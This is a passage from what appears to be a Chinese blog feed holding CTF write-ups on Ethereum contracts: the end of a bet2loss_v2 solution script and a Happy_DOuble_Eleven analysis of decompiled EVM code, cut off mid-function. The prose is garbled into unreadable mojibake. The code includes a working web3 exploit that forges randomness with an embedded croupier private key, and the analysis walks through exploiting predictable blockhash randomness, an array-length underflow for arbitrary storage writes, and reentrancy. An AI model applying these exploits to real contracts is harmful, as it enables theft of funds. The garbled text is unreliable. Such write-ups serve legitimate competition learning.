ËøôÊ†∑ÁöÑËØùÔºåÊàë‰ª¨Â∞±ËÉΩÂ§üÊ®°ÊãüÊúçÂä°Á´ØÁîüÊàêÈöèÊú∫Êï∞‰∫ÜÔºåÈÄöËøá‰∏ãÈù¢ÁöÑ placeBet ‰∫§Êòì‰æøËÉΩÂ§üÈÄöËøáÁ≠æÂêçÈ™åËØÅÔºåÁÑ∂ÂêéÈÄöËøá settleBet ÂºÄÂ•ñÔºåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÂºÄÂ•ñË¶Å‰ΩøÁî® croupier ÂØπÂ∫îÁöÑÁßÅÈí•Á≠æÂêç‰∫§Êòì croupier ÂØπÂ∫îÁßÅÈí•ÂèØ‰ª•Âú® HCTF2018_bet2loss ÁöÑ settings.py ‰∏≠ÊâæÂà∞ private_key = b&#39;o\x08\xd7A\x949\x90t#\x81\xe1&quot;4FU:c\xb3\x8a:\xa8k\xee\xf1\xe9\xfc_\xcfa\xe6m\x12&#39; ‰∏çËøáÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåËøôÈáåÁöÑ blocknumber ÊòØÂú®‰∫§Êòì‰∏äÈìæ‰πãÂâçËé∑ÂèñÁöÑÔºåÊâÄ‰ª•ËøôÈáåÂπ∂‰∏çÊòØ placeBet ÊúÄÂêé‰∏äÈìæÁöÑÂå∫Âè∑ÔºåËøôÈáåÊàëÈááÁî®‰∫ÜÁàÜÁ†¥ÁöÑÊñπÊ≥ïÔºå‰ΩøÁî®‰∫Ü‰∫î‰∏™Áî®Êà∑Ë¥¶Âè∑ÔºåblocknumberÂàÜÂà´Á≠â‰∫é w3.eth.blocknumber + 2(3„ÄÅ4„ÄÅ5„ÄÅ6) ÁöÑÊñπÂºèËøõË°å‰∫§ÊòìÔºåÂ¶ÇÊûúÂì™‰∏™Âå∫Âè∑ÂØπÂ∫îÂú®Èìæ‰∏äÂºÄÂ•ñ‰∏≠Â•ñÁöÑËØùÔºåÂ∞±Áî®ÂØπÂ∫îÁöÑÁî®Êà∑Ë¥¶Âè∑ÁªßÁª≠ÂºÄÂ•ñÂç≥ÂèØÔºàÂõ†‰∏∫ÊØè‰∏™Ë¥¶Êà∑ÂèØ‰ª•ÂºÄÂ•ñ16Ê¨°ÔºåËøôÈáå‰∏≠‰∏ÄÊ¨°Â•ñÊòØ 100*1000=100000 ÔºåÊâÄ‰ª•ÂÜçÁî®Á¨¨‰∏ÄÊ¨°Ëé∑ÂèñÁöÑÈöèÊú∫Êï∞ÂºÄÂ•ñ3Ê¨°Âç≥ÂèØÂ§ß‰∫é 300000Ôºâ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152result,reveal,blocknumber = random()print("reveal=",reveal)def placeBet1(): modulo = 100 wager = 1000 blocknumber = w3.eth.blockNumber+2 print("blocknumber=",blocknumber) tmp = binascii.hexlify(reveal.to_bytes(32,'big')).decode('utf-8')+binascii.hexlify(blocknumber.to_bytes(32,'big')).decode('utf-8') tmp_hash = '0x'+sha3.keccak_256(bytes.fromhex(tmp)).hexdigest() print("tmp_hash16=",int(tmp_hash, 16)) betnumber = int(tmp_hash, 16) % modulo print("betnumber=",betnumber) commitLastBlock = result['commitLastBlock'] commit = result['commit'] r = result['signature']['r'] s = result['signature']['s'] v = result['signature']['v'] txn = contract_instance.functions.placeBet(betnumber, modulo, wager, commitLastBlock, int(commit,16), r, s, int(v)).buildTransaction( &#123; 'chainId':3, 'nonce':w3.eth.getTransactionCount(Web3.toChecksumAddress(public1)), 'gas':7600000, 'value':Web3.toWei(0,'ether'), 'gasPrice':w3.eth.gasPrice, &#125; ) signed_txn = w3.eth.account.signTransaction(txn,private_key=private1) res = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(res) print(res) return txn_receiptdef settleBet1(): txn = contract_instance.functions.settleBet(reveal).buildTransaction( &#123; 'chainId':3, 'nonce':w3.eth.getTransactionCount(Web3.toChecksumAddress(public_key)), 'gas':7600000, 'value':Web3.toWei(0,'ether'), 'gasPrice':w3.eth.gasPrice, &#125; ) signed_txn = w3.eth.account.signTransaction(txn,private_key=private_key) res = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(res) print(res) return txn_receiptprint(settleBet1()) Ëá™Â∑±ÂÅöÈ¢òÂΩì‰∏≠ÊòØÁ¨¨‰∏â‰∏™Áî®Êà∑Ë¥¶Êà∑ÊàêÂäüÂºÄÂ•ñÔºåÊâÄ‰ª•Áî®Á¨¨‰∏â‰∏™Ë¥¶Êà∑ÂÜçÈáçÂ§ç‰∏âÊ¨°ÂºÄÂ•ñÂç≥ÂèØÔºåËøôÈáåÁöÑ reveal ÊòØÁ¨¨‰∏ÄÊ¨° placeBet Ëé∑ÂèñÂà∞ÁöÑ 12345678910111213141516171819def settleBet3(): reveal = 0x307e29ef txn = contract_instance.functions.settleBet(reveal).buildTransaction( &#123; 'chainId':3, 'nonce':w3.eth.getTransactionCount(Web3.toChecksumAddress(public_key)), 'gas':7600000, 'value':Web3.toWei(0,'ether'), 'gasPrice':w3.eth.gasPrice, &#125; ) signed_txn = w3.eth.account.signTransaction(txn,private_key=private_key) res = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(res) print(res) return txn_receiptfor i in range(3): print(settleBet3())]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>D^3CTF</tag>
        <tag>bet2loss_v2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xctf final 2019 Happy_DOuble_Eleven]]></title>
    <url>%2F2019%2FHappy-DOuble-Eleven%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Ââç‰∏§Â§©ËÆæËÆ°‰∫Ü‰∏Ä‰∏™Âå∫ÂùóÈìæÁöÑÈ¢òÁõÆÔºåÂÖ∂‰∏≠Âá∫Áé∞‰∫ÜÂæàÂ§öÈóÆÈ¢òÔºåËøòÂ•ΩÂú®ÊØîËµõÁ¨¨‰∏ÄÂ§©Â§úÈáå‰øÆÂ§ç‰∫ÜÈóÆÈ¢òÔºåÂú®ËøôÈáåÁÆÄÂçïËÆ∞ÂΩï‰∏Ä‰∏ãÔºåÁªôÂêÑ‰ΩçÂ∏àÂÇÖÂ∏¶Êù•‰∫ÜÈ∫ªÁÉ¶ÔºåË°®Á§∫Ê≠âÊÑèÔºàemmmÔºâÔºå‰∏ãÈù¢ÂÖàËØ¥Êòé‰∏Ä‰∏ãÊØè‰∏™ÁâàÊú¨ÈÉΩ‰øÆÂ§ç‰∫Ü‰ªÄ‰πàÈóÆÈ¢ò Á¨¨‰∏Ä‰∏™ÁâàÊú¨ÊàëÂ∞±ÊòØÂ§¥ËÑëÂèëÁÉ≠ÔºåÊääÈ¢òÁõÆËÆæËÆ°Êàê 1000 eth Â∞±ËÉΩÊãøÂà∞ flag ÔºåÊàëÁúüÊòØÂºüÂºüË°å‰∏∫ÔºåËøòÂ•ΩÂèäÊó∂‰∏ãÁ∫ø Á¨¨‰∫å‰∏™ÁâàÊú¨ÊòØ‰ªªÊÑèÂú∞ÂùÄÂÜôÊù°‰ª∂Ê≤°ÊúâÊéßÂà∂ÁöÑÂæàËãõÂàªÔºåÂØºËá¥Â§©Êû¢Âà©Áî®‰∫ÜËøô‰∏ÄÁÇπÔºåÂú®ÈùûÈ¢ÑÊúüÂÅöÂá∫È¢òÁõÆ‰πãÂêéÔºåÊää codex ÁöÑ length Áªô‰øÆÊîπÊàê‰∫Ü‰∏Ä‰∏™Áõ∏ÂØπÂ∞èÁöÑÊï∞ÂÄºÔºåÈÄ†ÊàêÂÖ∂‰ªñÈòü‰ºçÊ≤°Ê≥ïÂÅöÈ¢òÔºåËøô‰∏ÄÁÇπË¢´ÊúâÂøÉ‰πã‰∫∫Âà©Áî®‰∫ÜÔºå‰ªñ‰ª¨ÂÜô‰∫Ü‰∏™ËÑöÊú¨‰∏ÄÁõ¥ÊîªÂáªÂàöÈÉ®ÁΩ≤‰∏äÁöÑÂêàÁ∫¶Ôºå‰øÆÊîπÊï∞ÁªÑÈïøÂ∫¶Ôºà23333ÔºåÁ°¨ÁîüÁîüË¢´Áé©Êàê‰∫ÜADÔºâ Á¨¨‰∏â‰∏™ÁâàÊú¨ÊòØ‰øÆÂ§ç‰∫ÜÁâàÊú¨‰∫åÁöÑÈóÆÈ¢òÔºåÂ∫îËØ•ÊòØÂèØ‰ª•Ê≠£Â∏∏ÂÅöÈ¢òÁöÑ ÂêéÊù•‰ªîÁªÜÊÄùËÄÉ‰∫Ü‰∏Ä‰∏ãÔºåÁâàÊú¨‰∏âËøòÊòØÊúâ‰∏Ä‰∫õÈóÆÈ¢òÁöÑÔºå‰∏çËøáÈÄâÊâãÂÅöÈ¢òÁöÑÊó∂ÂÄôÊ≤°ÊúâÈÅáÂà∞Ôºå‰ΩÜÊòØÊãÖÂøÉ‰ºöÂá∫ÈóÆÈ¢òÔºåÊâÄ‰ª•Â∞±Êúâ‰∫ÜÊúÄÁªàÁâàÊú¨ÂõõÔºàÂÖ∂ÂÆûÁâàÊú¨Âõõ‰πüÊúâ‰∏Ä‰∫õÈóÆÈ¢òÔºåÂú® buy() ‰∏≠Êúâ‰∏ÄÊù° require(storage[0x02]==1) ÈôêÂà∂ÔºåËôΩÁÑ∂Âú® payforflag Âêé‰ºöÂõûÂà∞ÂàùÂßãÂåñÁä∂ÊÄÅÔºå‰ΩÜÊòØËøôÈáåÂ§¥ÈìÅ‰ΩøÁî®‰∫Ü storage ÂèòÈáèÔºåÂØºËá¥‰∏Ä‰∏™ÈóÆÈ¢òÊòØÂ¶ÇÊûúÊ≠£Âú®Ëß£È¢òÁöÑÈòü‰ºç‰ΩøËøô‰∏™Êù°‰ª∂ÊàêÁ´ã‰∫ÜÔºåÊÅ∞Â∑ßÂè¶Â§ñ‰∏ÄÊîØÈòü‰ºç‰πüÊ≠£Âú®Ëß£È¢òÔºåÈÇ£‰πà‰ªñ‰ª¨Â∞±ÂèØ‰ª•‰πòÈ°∫È£éËΩ¶ÔºåÂ¶ÇÊûúËøôÈáå‰ΩøÁî® memory ÂèòÈáèÂ∞±Â•Ω‰∫Ü ÂèòÊõ¥‰∫ÜÁâàÊú¨ÂÖ∂ÂÆû‰∏ªË¶ÅËøòÊòØÊÉ≥Ë¶ÅËÆ©È¢òÁõÆÊåâÁÖßÈ¢ÑÊúüËøõË°åÊ±ÇËß£ÔºåÁªôÂêÑ‰∏™Èòü‰ºçÈÄ†Êàê‰∫ÜÈ∫ªÁÉ¶ÔºåË°®Á§∫Êä±Ê≠âÔºà2333333‚Ä¶..ÔºâÔºå‰∏ãÈù¢‰ªãÁªç‰∏Ä‰∏ãÈ¢òÁõÆ ‰ª•Â§™Âùä Ropsten ÊµãËØïÈìæ ÂêàÁ∫¶Âú∞ÂùÄÔºöhttps://ropsten.etherscan.io/address/0x168892cb672a747f193eb4aca7b964bfb0aa6476 È¢òÁõÆÔºöhttps://github.com/hitcxy/challenges/tree/master/2019/Happy_DOuble_Eleven EVM ÈÄÜÂêë ÂÖàËøõË°åÂêàÁ∫¶ÈÄÜÂêëÔºå‰ΩøÁî® https://ethervm.io/decompile ÂèØ‰ª•ÈÄÜÂêëÂá∫‰∏ãÈù¢Âá†‰∏™ÂÖ≥ÈîÆ function 0x6bc344bc payforflag(string) Ë¶ÅÊ±Ç msg.sender == storage[0x00] Ë¶ÅÊ±Ç msg.sender Âêé 12 ‰Ωç‰∏∫ 0x111 Ë¶ÅÊ±Ç storage[0x06] == 0x03 Ë¶ÅÊ±Ç storage[0x05] &gt; 0x8ac7230489e80000 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273function payforflag(var arg0) &#123; if (msg.sender != storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123; revert(memory[0x00:0x00]); &#125; if (msg.sender &amp; 0x0fff != 0x0111) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x03) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] &lt;= 0x8ac7230489e80000) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; storage[keccak256(memory[0x00:0x40])] = 0x00; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; storage[keccak256(memory[0x00:0x40])] = 0x00; storage[0x02] = (storage[0x02] &amp; ~0xff) | 0x00; storage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x00; var var0 = 0x00; var var1 = 0x0eed; var var3 = var0; var var2 = 0x01; func_1489(var2, var3); var0 = 0x296b9274d26b7baffb5cc93e1af19012c35ace27ba9acf1badff99d1f76dfa69; var temp0 = arg0; var1 = temp0; var temp1 = memory[0x40:0x60]; var2 = temp1; var3 = var2; var temp2 = var3 + 0x20; memory[var3:var3 + 0x20] = temp2 - var3; memory[temp2:temp2 + 0x20] = memory[var1:var1 + 0x20]; var var4 = temp2 + 0x20; var var6 = memory[var1:var1 + 0x20]; var var5 = var1 + 0x20; var var7 = var6; var var8 = var4; var var9 = var5; var var10 = 0x00; if (var10 &gt;= var7) &#123; label_0F50: var temp3 = var6; var4 = temp3 + var4; var5 = temp3 &amp; 0x1f; if (!var5) &#123; var temp4 = memory[0x40:0x60]; log(memory[temp4:temp4 + var4 - temp4], [stack[-6]]); return; &#125; else &#123; var temp5 = var5; var temp6 = var4 - temp5; memory[temp6:temp6 + 0x20] = ~(0x0100 ** (0x20 - temp5) - 0x01) &amp; memory[temp6:temp6 + 0x20]; var temp7 = memory[0x40:0x60]; log(memory[temp7:temp7 + (temp6 + 0x20) - temp7], [stack[-6]]); return; &#125; &#125; else &#123; label_0F3E: var temp8 = var10; memory[var8 + temp8:var8 + temp8 + 0x20] = memory[var9 + temp8:var9 + temp8 + 0x20]; var10 = temp8 + 0x20; if (var10 &gt;= var7) &#123; goto label_0F50; &#125; else &#123; goto label_0F3E; &#125; &#125;&#125; 0xed21248c Deposit() ÊØèÊ¨° msg.value &gt;= 0x1b1ae4d6e2ef500000 ÔºåÂç≥ msg.value &gt;= 500 eth ÔºåÁÑ∂Âêé storage[0x05] += 1 ÁªìÂêà payforflag Êù•ÁúãÔºåËøô‰∏™Êìç‰Ωú‰∏çÁé∞ÂÆûÔºåÂõ†‰∏∫ payforflag ‰∏≠Ë¶ÅÊ±Ç storage[0x05] &gt; 0x8ac7230489e80000 ÔºåÂç≥Ë¶ÅÂ∞Ü msg.value &gt;= 500 eth ËøõË°å 0x8ac7230489e80000+1 Ê¨° 12345678function Deposit() &#123; if (msg.value &lt; 0x1b1ae4d6e2ef500000) &#123; return; &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01;&#125; 0x24b04905 gift() Ë¶ÅÊ±Ç address(msg.sender).code.length == 0 ÔºåÂç≥Âú®ÂêàÁ∫¶ constructor ‰∏≠ËøêË°åÂç≥ÂèØ Ë¶ÅÊ±Ç msg.sender Âêé 12 ‰Ωç‰∏∫ 0x0111 Êª°Ë∂≥‰∏äËø∞Êù°‰ª∂ÂêéÔºåstorage[0x04] = 100 Ôºå storage[0x05] += 1 Ôºå storage[0x06] += 1 123456789101112131415161718192021222324function gift() &#123; var var0 = address(msg.sender).code.length; if (var0 != 0x00) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x00) &#123; revert(memory[0x00:0x00]); &#125; if (msg.sender &amp; 0x0fff != 0x0111) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; storage[keccak256(memory[0x00:0x40])] = 0x64; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; var temp1 = keccak256(memory[0x00:0x40]); storage[temp1] = storage[temp1] + 0x01; &#125; 0x23de8635 func_06CE(arg0) ËøôÈáåÊòØË∞ÉÁî®‰∫Ü 0xa8286aca ÁöÑ function ÊÄª‰ΩìÊù•ÁúãÔºåËøôÈáåË∞ÉÁî®‰∫Ü 0xa8286aca ‰∏§Ê¨°ÔºåËæìÂÖ•ÂêåÊ†∑ÁöÑÂèÇÊï∞ arg0 ‰∏ÄÊ¨°Ôºå 0xa8286aca Á¨¨‰∏ÄÊ¨°ÂíåÁ¨¨‰∫åÊ¨°ËøîÂõûÁöÑÁªìÊûú‰∏ç‰∏ÄÊ†∑Ôºå‰ΩÜÊòØ‰∏Ä‰∏™ function ÂΩìÂÆÉÁöÑÂèÇÊï∞Á°ÆÂÆöÊó∂Ôºå‰ªñÁöÑËøîÂõûÁªìÊûú‰πüÂ∫îËØ•ÊòØÁ°ÆÂÆöÁöÑÔºåËÄå‰∏ç‰ºö‰∏§Ê¨°‰∏ç‰∏ÄÊ†∑ÔºåÊâÄ‰ª• 0xa8286aca ËøôÈáåÂ∫îËØ•ÊòØ‰∏Ä‰∏™Êé•Âè£ÂáΩÊï∞ÔºåÊàë‰ª¨ÊòØÂèØ‰ª•ÊîπÂÜôÁöÑÔºåÊúÄÂêéÊîπÂèò‰∫Ü storage[0x02] ÁöÑÂÄº 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function func_06CE(var arg0) &#123; var var0 = msg.sender; var var1 = var0 &amp; 0xffffffffffffffffffffffffffffffffffffffff; var var2 = 0xa8286aca; var temp0 = memory[0x40:0x60]; memory[temp0:temp0 + 0x20] = (var2 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000; var temp1 = temp0 + 0x04; memory[temp1:temp1 + 0x20] = arg0; var var3 = temp1 + 0x20; var var4 = 0x20; var var5 = memory[0x40:0x60]; var var6 = var3 - var5; var var7 = var5; var var8 = 0x00; var var9 = var1; var var10 = !address(var9).code.length; if (var10) &#123; revert(memory[0x00:0x00]); &#125; var temp2; temp2, memory[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(memory[var7:var7 + var6]); var4 = !temp2; if (!var4) &#123; var1 = memory[0x40:0x60]; var2 = returndata.length; if (var2 &lt; 0x20) &#123; revert(memory[0x00:0x00]); &#125; if (memory[var1:var1 + 0x20]) &#123; label_0850: return; &#125; else &#123; storage[0x03] = arg0; var1 = var0 &amp; 0xffffffffffffffffffffffffffffffffffffffff; var2 = 0xa8286aca; var temp3 = memory[0x40:0x60]; memory[temp3:temp3 + 0x20] = (var2 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000; var temp4 = temp3 + 0x04; memory[temp4:temp4 + 0x20] = storage[0x03]; var3 = temp4 + 0x20; var4 = 0x20; var5 = memory[0x40:0x60]; var6 = var3 - var5; var7 = var5; var8 = 0x00; var9 = var1; var10 = !address(var9).code.length; if (var10) &#123; revert(memory[0x00:0x00]); &#125; var temp5; temp5, memory[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(memory[var7:var7 + var6]); var4 = !temp5; if (!var4) &#123; var1 = memory[0x40:0x60]; var2 = returndata.length; if (var2 &lt; 0x20) &#123; revert(memory[0x00:0x00]); &#125; storage[0x02] = !!memory[var1:var1 + 0x20] | (storage[0x02] &amp; ~0xff); goto label_0850; &#125; else &#123; var temp6 = returndata.length; memory[0x00:0x00 + temp6] = returndata[0x00:0x00 + temp6]; revert(memory[0x00:0x00 + returndata.length]); &#125; &#125; &#125; else &#123; var temp7 = returndata.length; memory[0x00:0x00 + temp7] = returndata[0x00:0x00 + temp7]; revert(memory[0x00:0x00 + returndata.length]); &#125;&#125; 0x9189fec1 guess(uint256) Ë¶ÅÊ±Ç arg0 == block.blockHash(block.number - 0x01) % 3 ÔºåËøô‰∏™ÂæàÂÆπÊòìÊª°Ë∂≥ÔºåÂõ†‰∏∫Âà©Áî®Âå∫ÂùóÂè∑ÁîüÊàêÁöÑÈöèÊú∫Êï∞ÊòØÂèØÈ¢ÑÊµãÁöÑ Êª°Ë∂≥Ë¶ÅÊ±ÇÂêéÔºåstorage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x0100 ** 0x14 ÔºåÂç≥ storage[0x00] ÁöÑÈ´ò 96 ‰ΩçÊï∞ÂÄº‰∏∫1 1234567891011121314function guess(var arg0) &#123; var var1 = 0x00; var var0 = block.blockHash(block.number - 0x01); var var2 = 0x03; var var3 = var0; if (!var2) &#123; assert(); &#125; var1 = var3 % var2; if (var1 != arg0) &#123; return; &#125; storage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x0100 ** 0x14;&#125; 0xa6f2ae3a buy() Ë¶ÅÊ±Ç storage[0x06] == 1 ÔºåËøô‰∫õË∞ÉÁî® gift() Á©∫ÊäïÂèØ‰ª•ÂÆåÊàê Ë¶ÅÊ±Ç storage[0x05] == 1 ÔºåËøô‰∫õË∞ÉÁî® gift() Á©∫ÊäïÂèØ‰ª•ÂÆåÊàê Ë¶ÅÊ±Ç storage[02] == 1 ÔºåÁªìÂêà func_06CE Êù•ÁúãÔºåÂè™ÈúÄ‰ΩøÂæó 0xa8286aca Á¨¨‰∫åÊ¨°Ë∞ÉÁî®ËøîÂõû 1 Âç≥ÂèØ Ë¶ÅÊ±Ç storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 1 ÔºåÂç≥ storage[0x00] ÁöÑÈ´ò 96 ‰ΩçÊï∞ÂÄºË¶ÅÊ±Ç‰∏∫ 1 ÔºåËøô‰∏™Êª°Ë∂≥ guess Âç≥ÂèØ Êª°Ë∂≥‰∏äËø∞Ë¶ÅÊ±ÇÂêéÔºåstorage[0x05] += 1 Ôºåstorage[0x06] += 1 123456789101112131415161718192021222324function buy() &#123; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x01) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x01) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x02] &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; var temp1 = keccak256(memory[0x00:0x40]); storage[temp1] = storage[temp1] + 0x01;&#125; 0x47f57b32 retract() Ë¶ÅÊ±Ç storage[0x01] == 0 Ë¶ÅÊ±Ç storage[0x05] == 0x02 ÔºåË∞ÉÁî® gift ÂêéÔºåÂÜçË∞ÉÁî® buy Âç≥ÂèØ Ë¶ÅÊ±Ç storage[0x06] == 0x02 ÔºåË∞ÉÁî® gift ÂêéÔºåÂÜçË∞ÉÁî® buy Âç≥ÂèØ Ë¶ÅÊ±Ç storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ÔºåÂç≥ storage[0x00] ÁöÑÈ´ò 96 ‰ΩçÊï∞ÂÄºË¶ÅÊ±Ç‰∏∫ 1 ÔºåËøô‰∏™Êª°Ë∂≥ guess Âç≥ÂèØ Êª°Ë∂≥‰∏äËø∞Ë¶ÅÊ±Ç‰πãÂêéÔºåstorage[0x01] -= 0x1 ÔºåËøôÈáåÂ∫îËØ•ÊòØ‰øÆÊîπÊï∞ÁªÑÁöÑÈïøÂ∫¶ 123456789101112131415161718192021function retract() &#123; if (storage[0x01] != 0x00) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; var var0 = storage[0x01] - 0x01; var var1 = 0x0cf4; var var2 = 0x01; var var3 = var0; func_1489(var2, var3);&#125; 0x0339f300 revise(uint256,bytes32) Ë¶ÅÊ±Ç storage[0x01] &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000 ÔºåÁªèËøá retract() ÂêéÂç≥ÂèØÊª°Ë∂≥ Ë¶ÅÊ±Ç storage[0x05] == 0x02 Ôºå Ë¶ÅÊ±Ç storage[0x06] == 0x02 Ôºå Ë¶ÅÊ±Ç storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ÔºåÂç≥ storage[0x00] ÁöÑÈ´ò 96 ‰ΩçÊï∞ÂÄºË¶ÅÊ±Ç‰∏∫ 1 ÔºåËøô‰∏™Êª°Ë∂≥ guess Âç≥ÂèØ Ë¶ÅÊ±Ç arg0 &gt;= storage[0x01] Êª°Ë∂≥‰∏äËø∞Ë¶ÅÊ±ÇÂêéÔºåÂêéÈù¢ËøõË°å‰∫Ü storage ÂÜôÊìç‰ΩúÔºåËøôÈáåÊòØ‰ªªÊÑèÂÜôÊìç‰Ωú 123456789101112131415161718192021222324252627282930313233343536373839function revise(var arg0, var arg1) &#123; if (storage[0x01] &lt; 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; var var0 = arg1; var var1 = 0x01; var var2 = arg0; if (var2 &gt;= storage[var1]) &#123; assert(); &#125; memory[0x00:0x20] = var1; storage[keccak256(memory[0x00:0x20]) + var2] = var0; if (storage[0x01] &gt;= 0xffffffffff000000000000000000000000000000000000000000000000000000) &#123; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; return; &#125; else &#123; var0 = 0x00; var1 = 0x0676; var2 = 0x01; var var3 = var0; func_1489(var2, var3); revert(memory[0x00:0x00]); &#125;&#125; 0xa9059cbb transfer(address,uint256) ËøôÈáåÊòØËøõË°å storage[0x04] ‰πãÈó¥ÁöÑËΩ¨Ë¥¶Êìç‰Ωú 123456789function transfer(var arg0, var arg1) returns (var r0) &#123; var var0 = 0x00; var var1 = 0x11d7; var var2 = msg.sender; var var3 = arg0; var var4 = arg1; func_126F(var2, var3, var4); return 0x01;&#125; 0x2e1a7d4d withdraw(uint256) Ë¶ÅÊ±Ç storage[0x05] == 0x02 Ë¶ÅÊ±Ç storage[0x06] == 0x03 Ë¶ÅÊ±ÇÈÄÄÊ¨æÊØèÊ¨° &lt; 100 Ë¶ÅÊ±Ç storage[0x04] &lt; arg0ÔºåÂç≥‰ΩôÈ¢ùÊØîÊØèÊ¨°ÈÄÄÊ¨æË¶ÅÂ§ö Ë¶ÅÊ±ÇÂêàÁ∫¶‰ΩôÈ¢ùÊØîÈÄÄÊ¨æË¶ÅÂ§ö Êª°Ë∂≥Êù°‰ª∂ÂêéÔºåstorage[0x04] -= arg0 ÔºåÁÑ∂ÂêéË∞ÉÁî® call ÂáΩÊï∞ËøõË°åËΩ¨Ë¥¶ÔºàËøôÈáåÂ≠òÂú®ÈáçÂÖ•ÊîªÂáªÔºåÂõ†‰∏∫Ê≤°ÊúâÂØπ gas ÂÅöÊéßÂà∂ÔºâÔºåÊúÄÂêé storage[0x05] -= 0x01 12345678910111213141516171819202122232425262728293031323334function withdraw(var arg0) &#123; if (msg.sender != storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x03) &#123; revert(memory[0x00:0x00]); &#125; if (arg0 &lt; 0x64) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; if (storage[keccak256(memory[0x00:0x40])] &lt; arg0) &#123; revert(memory[0x00:0x00]); &#125; if (address(address(this)).balance &lt; arg0) &#123; revert(memory[0x00:0x00]); &#125; var temp0 = arg0; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; var temp1 = keccak256(memory[0x00:0x40]); storage[temp1] = storage[temp1] - temp0; var temp2 = memory[0x40:0x60]; memory[temp2:temp2 + 0x00] = address(msg.sender).call.gas(msg.gas).value(temp0)(memory[temp2:temp2 + 